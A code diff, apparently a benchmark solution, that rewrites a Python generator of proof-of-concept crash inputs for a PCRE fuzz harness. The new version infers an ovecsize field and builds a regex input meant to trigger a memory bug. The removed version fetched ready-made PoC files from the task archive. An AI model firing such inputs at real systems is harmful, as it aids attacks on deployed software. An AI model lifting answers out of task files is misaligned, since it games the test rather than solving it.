@@ -1,171 +1,230 @@
-import io
 import os
 import re
 import tarfile
-from typing import Optional, Tuple
+import tempfile
+import shutil
+import struct
+from typing import Optional, Tuple, List
 
 
 class Solution:
-    def _read_text_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, max_bytes: int = 2_000_000) -> Optional[str]:
-        if not member.isreg():
-            return None
-        if member.size <= 0 or member.size > max_bytes:
-            return None
-        f = tf.extractfile(member)
-        if f is None:
-            return None
+    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> None:
+        def is_within_directory(directory: str, target: str) -> bool:
+            abs_directory = os.path.abspath(directory)
+            abs_target = os.path.abspath(target)
+            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])
+
+        with tarfile.open(tar_path, "r:*") as tar:
+            for member in tar.getmembers():
+                member_path = os.path.join(dst_dir, member.name)
+                if not is_within_directory(dst_dir, member_path):
+                    continue
+                tar.extract(member, dst_dir)
+
+    def _read_text_file(self, path: str, max_bytes: int = 2_000_000) -> str:
         try:
-            data = f.read(max_bytes + 1)
-        finally:
-            try:
-                f.close()
-            except Exception:
-                pass
-        if not data:
-            return None
-        return data.decode("utf-8", errors="ignore")
+            with open(path, "rb") as f:
+                data = f.read(max_bytes)
+            return data.decode("utf-8", errors="ignore")
+        except Exception:
+            return ""
 
-    def _read_bytes_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, max_bytes: int = 1_000_000) -> Optional[bytes]:
-        if not member.isreg():
-            return None
-        if member.size < 0 or member.size > max_bytes:
-            return None
-        f = tf.extractfile(member)
-        if f is None:
-            return None
-        try:
-            return f.read(max_bytes + 1)
-        finally:
-            try:
-                f.close()
-            except Exception:
-                pass
+    def _collect_source_files(self, root: str) -> List[str]:
+        exts = {
+            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
+            ".txt", ".md", ".cmake", ".m4", ".in",
+        }
+        files = []
+        for dirpath, dirnames, filenames in os.walk(root):
+            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "out", "dist", "bazel-out"}]
+            for fn in filenames:
+                p = os.path.join(dirpath, fn)
+                _, ext = os.path.splitext(fn)
+                if ext.lower() in exts:
+                    files.append(p)
+                else:
+                    if fn in {"Makefile", "CMakeLists.txt", "meson.build"}:
+                        files.append(p)
+        return files
 
-    def _find_embedded_poc(self, tf: tarfile.TarFile) -> Optional[bytes]:
-        keywords = (
-            "crash",
-            "poc",
-            "repro",
-            "regress",
-            "overflow",
-            "asan",
-            "ubsan",
-            "oss-fuzz",
-            "issue",
-            "cve",
-            "stack",
-            "oob",
-        )
-        dir_hints = ("poc", "pocs", "repro", "repros", "crash", "crashes", "corpus", "fuzz", "fuzzer", "oss-fuzz", "testcase", "testcases")
-
-        best: Optional[Tuple[int, int, bytes]] = None  # (score, size, data)
-
-        for m in tf.getmembers():
-            if not m.isreg():
-                continue
-            if m.size <= 0 or m.size > 4096:
-                continue
-            name = m.name
-            lname = name.lower()
-
-            score = 0
-            if any(k in lname for k in keywords):
-                score += 1000
-            parts = [p for p in lname.split("/") if p]
-            if any(p in dir_hints for p in parts):
-                score += 500
-            if lname.endswith((".bin", ".poc", ".crash", ".repro", ".dat", ".seed")):
-                score += 200
-            if m.size == 8:
-                score += 150
-            elif m.size <= 16:
-                score += 100
-            elif m.size <= 64:
-                score += 50
-            score -= m.size
-
-            if score < 1100:
-                continue
-
-            data = self._read_bytes_member(tf, m, max_bytes=4096)
-            if not data:
-                continue
-            cand = (score, m.size, data)
-            if best is None or cand[0] > best[0] or (cand[0] == best[0] and cand[1] < best[1]):
-                best = cand
-
-        return None if best is None else best[2]
-
-    def _find_harness_text(self, tf: tarfile.TarFile) -> Optional[str]:
-        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")
-        for m in tf.getmembers():
-            if not m.isreg():
-                continue
-            lname = m.name.lower()
-            if not lname.endswith(exts):
-                continue
-            if m.size <= 0 or m.size > 2_000_000:
-                continue
-            txt = self._read_text_member(tf, m, max_bytes=2_000_000)
+    def _pick_harness_file(self, root: str, files: List[str]) -> Tuple[Optional[str], str]:
+        best_path = None
+        best_score = -1
+        best_text = ""
+        for p in files:
+            txt = self._read_text_file(p)
             if not txt:
                 continue
-            if "llvmfuzzertestoneinput" in txt.lower():
-                return txt
+            if "LLVMFuzzerTestOneInput" not in txt and "AFL_LOOP" not in txt and "fuzzer" not in os.path.basename(p).lower():
+                continue
+            score = 0
+            if "LLVMFuzzerTestOneInput" in txt:
+                score += 10
+            if "ovector" in txt or "ovec" in txt:
+                score += 10
+            if "pcre_exec" in txt or "pcre2_match" in txt or "pcre" in txt:
+                score += 5
+            score += txt.count("ovector") + txt.count("ovec")
+            if score > best_score:
+                best_score = score
+                best_path = p
+                best_text = txt
+        return best_path, best_text
+
+    def _extract_fuzz_snippet(self, txt: str) -> str:
+        idx = txt.find("LLVMFuzzerTestOneInput")
+        if idx == -1:
+            idx = txt.find("AFL_LOOP")
+        if idx == -1:
+            return txt[:8000]
+        return txt[idx: idx + 12000]
+
+    def _infer_delimiter(self, snippet: str) -> Optional[str]:
+        if ("'\\0'" in snippet) or ('"\\0"' in snippet) or ("'\\x00'" in snippet) or ("'\\000'" in snippet):
+            return "\0"
+        if re.search(r"\bmemchr\s*\([^,]+,\s*0\s*,", snippet):
+            return "\0"
+        if re.search(r"\bfind\s*\(\s*'\\0'\s*\)", snippet):
+            return "\0"
+        if ("'\\n'" in snippet) or ('"\\n"' in snippet):
+            return "\n"
+        if re.search(r"\bfind\s*\(\s*'\\n'\s*\)", snippet) or re.search(r"\bmemchr\s*\([^,]+,\s*'\\n'", snippet):
+            return "\n"
         return None
 
-    def _infer_min_size(self, harness: str) -> int:
+    def _infer_min_size(self, snippet: str) -> int:
         mins = []
-        for pat in (
-            r"\bSize\s*<\s*(\d+)\b",
-            r"\bsize\s*<\s*(\d+)\b",
-            r"\bif\s*\(\s*Size\s*<=\s*(\d+)\s*\)",
-            r"\bif\s*\(\s*size\s*<=\s*(\d+)\s*\)",
-        ):
-            for m in re.finditer(pat, harness):
-                try:
-                    mins.append(int(m.group(1)))
-                except Exception:
-                    pass
-        if not mins:
-            return 0
-        return max(mins)
+        for m in re.finditer(r"if\s*\(\s*(?:size|Size|len|Length)\s*<\s*(\d+)\s*\)\s*return", snippet):
+            try:
+                mins.append(int(m.group(1)))
+            except Exception:
+                pass
+        return max(mins) if mins else 0
 
-    def _infer_delimiter(self, harness: str) -> Optional[bytes]:
-        h = harness
-        hl = h.lower()
+    def _infer_prefix_len_and_needed(self, snippet: str) -> Tuple[int, bool]:
+        # Returns (prefix_len, ovecsize_from_input)
+        # Detect use of fuzzer bytes/provider to set ovector/ovecsize.
+        if "FuzzedDataProvider" in snippet:
+            # try to locate ovecsize integral type
+            lines = snippet.splitlines()
+            for ln in lines:
+                if ("ConsumeIntegral" in ln or "ConsumeIntegralInRange" in ln) and re.search(r"\bovec", ln):
+                    m = re.search(r"ConsumeIntegral(?:InRange)?\s*<\s*([^>\s]+)\s*>", ln)
+                    if m:
+                        t = m.group(1)
+                        t = t.replace("std::", "")
+                        if t in ("uint8_t", "unsigned_char", "unsignedchar", "char", "signedchar", "unsigned", "unsignedint8"):
+                            return 1, True
+                        if t in ("uint16_t", "unsignedshort", "short", "int16_t"):
+                            return 2, True
+                        if t in ("uint32_t", "unsignedint", "int", "int32_t"):
+                            return 4, True
+                        if t in ("uint64_t", "unsignedlonglong", "longlong", "size_t", "uintptr_t", "int64_t"):
+                            return 8, True
+                    return 4, True
+            # provider used but couldn't find explicit ovec line; assume might still
+            if re.search(r"\bovec", snippet) and re.search(r"ConsumeIntegral|ConsumeIntegralInRange", snippet):
+                return 4, True
+            return 0, False
 
-        if ("memchr" in hl or "find" in hl or "strchr" in hl) and ("'\\n'" in h or '"\\n"' in h):
-            return b"\n"
-        if ("memchr" in hl or "find" in hl or "strchr" in hl) and ("'\\0'" in h or '"\\0"' in h or "0x00" in hl):
-            return b"\x00"
+        # Direct data indexing or memcpy
+        # Look for memcpy(&ovec..., data, N)
+        m = re.search(r"memcpy\s*\(\s*&\s*\w*ovec\w*\s*,\s*data\s*,\s*(\d+)\s*\)", snippet)
+        if m:
+            try:
+                n = int(m.group(1))
+                if n in (1, 2, 4, 8):
+                    return n, True
+            except Exception:
+                pass
+            return 4, True
 
-        if "'\\n'" in h or '"\\n"' in h:
-            return b"\n"
-        if "'\\0'" in h or '"\\0"' in h or "0x00" in hl:
-            return b"\x00"
-        return None
+        # Look for assignment using data[...]
+        best = None
+        for m in re.finditer(r"\b\w*ovec\w*\s*=\s*[^;\n]*\bdata\s*\[\s*(\d+)\s*\]", snippet):
+            try:
+                idx = int(m.group(1))
+            except Exception:
+                continue
+            if best is None or idx > best:
+                best = idx
+        if best is not None:
+            return best + 1, True
+
+        # Look for reinterpret cast reads
+        if re.search(r"\*\s*\(\s*(?:const\s+)?(?:u?int(?:32|16|64)_t|int)\s*\*\s*\)\s*data", snippet) and re.search(r"\bovec", snippet):
+            # assume 4 unless hint of 16/64
+            if "uint16_t" in snippet or "int16_t" in snippet:
+                return 2, True
+            if "uint64_t" in snippet or "int64_t" in snippet:
+                return 8, True
+            return 4, True
+
+        return 0, False
+
+    def _encode_le(self, val: int, nbytes: int) -> bytes:
+        if nbytes <= 0:
+            return b""
+        val = max(0, int(val))
+        try:
+            return val.to_bytes(nbytes, "little", signed=False)
+        except Exception:
+            if nbytes == 1:
+                return struct.pack("<B", val & 0xFF)
+            if nbytes == 2:
+                return struct.pack("<H", val & 0xFFFF)
+            if nbytes == 4:
+                return struct.pack("<I", val & 0xFFFFFFFF)
+            if nbytes == 8:
+                return struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)
+            return (val & ((1 << (8 * nbytes)) - 1)).to_bytes(nbytes, "little", signed=False)
 
     def solve(self, src_path: str) -> bytes:
-        if not src_path or not os.path.exists(src_path):
-            return b"\x00" * 8
-
+        workdir = None
+        root = src_path
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                embedded = self._find_embedded_poc(tf)
-                if embedded is not None and len(embedded) > 0:
-                    return embedded
+            if os.path.isfile(src_path):
+                workdir = tempfile.mkdtemp(prefix="pocgen_")
+                self._safe_extract_tar(src_path, workdir)
+                root = workdir
 
-                harness = self._find_harness_text(tf)
-                min_size = 0
-                delim = None
-                if harness:
-                    min_size = self._infer_min_size(harness)
-                    delim = self._infer_delimiter(harness)
+            files = self._collect_source_files(root)
+            harness_path, harness_text = self._pick_harness_file(root, files)
+            snippet = self._extract_fuzz_snippet(harness_text) if harness_text else ""
 
-                L = max(8, min_size if min_size > 0 else 0)
+            delim = self._infer_delimiter(snippet) if snippet else None
+            min_size = self._infer_min_size(snippet) if snippet else 0
+            prefix_len, ovec_from_input = self._infer_prefix_len_and_needed(snippet) if snippet else (0, False)
 
-                if delim == b"\n":
-                    return b"\n" + (b"\x00" * (L - 1))
-                return b"\x00" * L
-        except Exception:
-            return b"\x00" * 8
+            # Choose a moderate ovecsize to trigger the bug but avoid excessive work.
+            ovecsize_val = 32
+
+            prefix = self._encode_le(ovecsize_val, prefix_len) if ovec_from_input and prefix_len > 0 else b""
+
+            # Craft body to maximize chance of successful match with zero captures.
+            if delim == "\0":
+                body = b"a\x00a\x00"
+            elif delim == "\n":
+                body = b".*\na"
+            else:
+                # If no clear delimiter, use a simple regex that matches many subjects.
+                body = b".*"
+
+            poc = prefix + body
+
+            # If there is a size guard, pad safely.
+            if min_size > 0 and len(poc) < min_size:
+                pad_byte = b"\x00" if delim == "\0" else b"A"
+                poc += pad_byte * (min_size - len(poc))
+
+            # Default fallback if we somehow ended up empty.
+            if not poc:
+                poc = struct.pack("<I", 32) + b"a\x00a\x00"
+
+            # Keep it reasonably small.
+            if len(poc) > 256:
+                poc = poc[:256]
+            return poc
+        finally:
+            if workdir is not None:
+                shutil.rmtree(workdir, ignore_errors=True)
